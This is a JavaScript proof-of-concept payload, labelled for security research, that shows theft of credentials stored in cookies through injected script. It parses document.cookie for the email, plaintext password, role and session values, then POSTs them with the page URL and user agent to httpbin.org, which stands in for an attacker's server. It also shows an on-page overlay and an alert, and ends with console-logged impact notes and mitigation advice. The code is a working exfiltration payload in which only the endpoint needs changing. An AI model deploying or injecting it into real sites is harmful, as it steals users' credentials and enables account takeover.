// Cookie Credential Theft Payload - FOR SECURITY RESEARCH ONLY
// This payload demonstrates how stored credentials in cookies can be stolen

console.log("🚨 COOKIE CREDENTIAL THEFT PAYLOAD ACTIVATED! 🚨");

// Function to parse cookies and extract credentials
function extractCredentialsFromCookies() {
    const cookies = document.cookie.split(';').reduce((acc, cookie) => {
        const [key, value] = cookie.trim().split('=');
        if (key && value) {
            acc[key] = decodeURIComponent(value);
        }
        return acc;
    }, {});

    const credentials = {
        email: cookies.user_email || 'Not found',
        password: cookies.user_password || 'Not found', // CRITICAL: Password in plaintext!
        userId: cookies.user_id || 'Not found',
        userRole: cookies.user_role || 'Not found', 
        userName: cookies.user_name || 'Not found',
        loginTimestamp: cookies.login_timestamp || 'Not found',
        allCookies: cookies
    };

    return credentials;
}

// Extract credentials
const stolenCredentials = extractCredentialsFromCookies();

console.log("🔓 CREDENTIALS SUCCESSFULLY STOLEN FROM COOKIES:");
console.log("===============================================");
console.log("📧 Email:", stolenCredentials.email);
console.log("🔑 Password:", stolenCredentials.password); // EXTREME VULNERABILITY!
console.log("🆔 User ID:", stolenCredentials.userId);
console.log("👤 Role:", stolenCredentials.userRole);
console.log("📛 Name:", stolenCredentials.userName);
console.log("🕒 Login Time:", stolenCredentials.loginTimestamp);
console.log("🍪 All Cookies:", stolenCredentials.allCookies);

// Simulate sending stolen credentials to attacker server
const exfiltrateCredentials = async () => {
    const payload = {
        type: 'credential_theft',
        timestamp: new Date().toISOString(),
        victim_url: window.location.href,
        user_agent: navigator.userAgent,
        stolen_credentials: stolenCredentials,
        attack_vector: 'cookie_credential_storage'
    };

    console.log("📡 Sending stolen credentials to attacker server...");
    
    try {
        // In real attack, this would go to attacker's server
        const response = await fetch('https://httpbin.org/post', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        
        console.log("✅ Credentials successfully exfiltrated!");
        console.log("🔗 Server response:", response.status);
    } catch (error) {
        console.log("❌ Exfiltration failed (but credentials are still compromised):", error);
    }
};

// Execute credential theft
exfiltrateCredentials();

// Create visual proof of compromise
const createVisualProof = () => {
    const proofDiv = document.createElement('div');
    proofDiv.innerHTML = `
        <div style="
            position: fixed;
            top: 20px;
            right: 20px;
            background: #ff4444;
            color: white;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 12px;
            z-index: 9999;
            max-width: 300px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        ">
            <div style="font-weight: bold; margin-bottom: 8px;">🚨 CREDENTIALS STOLEN!</div>
            <div>Email: ${stolenCredentials.email}</div>
            <div>Password: ${'*'.repeat(stolenCredentials.password.length)}</div>
            <div>Role: ${stolenCredentials.userRole}</div>
            <div style="margin-top: 8px; font-size: 10px; opacity: 0.8;">
                Check console for full details
            </div>
        </div>
    `;
    
    document.body.appendChild(proofDiv);
    
    // Remove after 10 seconds
    setTimeout(() => {
        if (proofDiv.parentNode) {
            proofDiv.parentNode.removeChild(proofDiv);
        }
    }, 10000);
};

createVisualProof();

// Log additional security implications
console.log("🎯 SECURITY IMPACT ANALYSIS:");
console.log("===============================");
console.log("🔴 CRITICAL: Plaintext password stored in cookies");
console.log("🔴 HIGH: User credentials accessible via XSS");
console.log("🔴 HIGH: Session hijacking possible");
console.log("🔴 MEDIUM: User enumeration possible");
console.log("🔴 MEDIUM: Privilege escalation vectors");

console.log("🛡️ MITIGATION RECOMMENDATIONS:");
console.log("================================");
console.log("✅ NEVER store passwords in cookies");
console.log("✅ Use secure, httpOnly cookies for session tokens");
console.log("✅ Implement proper session management");
console.log("✅ Use encrypted storage for sensitive data");
console.log("✅ Implement Content Security Policy (CSP)");

// Alert to show successful credential theft
alert(`🚨 CREDENTIAL THEFT SUCCESSFUL! 🚨

Stolen Data:
- Email: ${stolenCredentials.email}
- Password: ${stolenCredentials.password ? '[EXPOSED]' : '[NOT FOUND]'}
- Role: ${stolenCredentials.userRole}

Check console for complete stolen data!

This demonstrates why storing credentials in cookies is extremely dangerous.`);

console.log("💀 PAYLOAD EXECUTION COMPLETE");
console.log("📋 Attack Vector: Cookie-based credential storage vulnerability");
console.log("🎯 Impact: Complete credential compromise + account takeover potential");